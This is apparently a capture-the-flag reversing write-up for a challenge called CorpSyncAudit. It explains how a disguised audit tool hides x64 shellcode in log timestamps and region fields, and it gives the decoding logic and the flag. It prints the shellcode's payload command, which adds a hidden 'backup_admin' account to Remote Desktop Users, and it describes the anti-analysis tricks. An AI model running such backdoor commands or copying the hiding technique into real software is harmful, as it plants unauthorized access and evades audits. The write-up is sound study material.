# CorpSyncAudit

**Cyber Apocalypse CTF 2026 — Reversing**

> Whoever builds the audit tooling gets to decide what the tooling actually checks for… The logs came
> back clean, the audits passed, and nobody thought to look twice at a report that told them exactly
> what they wanted to hear.

## TL;DR

An "audit tool" (`.exe`) parses replication logs. Hidden in the **date/time and Region fields** of one
oversized log is an exfiltration channel: each record encodes 4 bytes. Decoded, the stream is **x64
shellcode** that injects a `net user` backdoor into `explorer.exe`; the new user's password is the
base64 flag.

## Recon

`CorpSyncAudit.exe` is a stripped mingw-w64 C++ PE. `objdump` reads `pei-x86-64` fine. Most logs are
~940 B decoys with clean regions; `sync_20260412_192364.log` is **12 KB** with garbage geographic
regions — the payload.

Strings are XOR-obfuscated (4-byte key `9f 50 66 20`); deobfuscating reveals `Region=`, the `sscanf`
format `"%63[^,], %d/%d/%d %d:%d:%d %15s %15s"`, `explorer.exe`, `C:\hyberfile.sys`, etc.

## The covert channel

For each date line, the tool reconstructs 4 payload bytes:

```python
idx  = table32[ fmix64(fnv1a_ror13(REGION)) ]   # 0..31  -> 5 bits (MSB first)
xkey = weekday_number                            # Monday=1 .. Sunday=7
if TZ == "GMT":                                  # reversible scramble
    mid = (h + m - s) >> 1;  h, m, s = h-mid, mid, m-mid
# the 5 region bits toggle date fields:
h ^= 12 if b0 ; m ^= 30 if b1 ; s ^= 30 if b2 ; day ^= 16 if b3 ; month ^= 6 if b4
val = (h<<27)|(m<<21)|(s<<15)|(day<<10)|(month<<6)|(year-1990)
out[j] = big_endian(val)[j] ^ xkey ^ seed[j]
```

`seed` comes from an anti-analysis fingerprint (`sidt`, timing, `C:\hyberfile.sys`), but we don't need to
emulate it: the decoded 396-byte buffer is **shellcode**, so it must start with the classic x64 stub
`fc 48 83 e4 f0`. That pins `seed = F0 7E C6 A4` (`0xF07EC6A4`) — a constant that also appears verbatim
in the binary.

## Payload

XOR-decoding with that key yields valid x64 shellcode (resolves APIs by hash, injects into
`explorer.exe`) whose command is:

```
net user backup_admin SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ== /add
&& net localgroup "Remote Desktop Users" backup_admin /add
```

```python
>>> base64.b64decode("SFRCe2Q0NzNfNzFtM180bmRfNjRja2QwMHI1fQ==")
b'HTB{d473_71m3_4nd_64ckd00r5}'
```

Fitting theme: **date, time and backdoors** — the data was hidden in log timestamps, and the real audit
"finding" was a hidden admin account.

## Flag

```
HTB{d473_71m3_4nd_64ckd00r5}
```
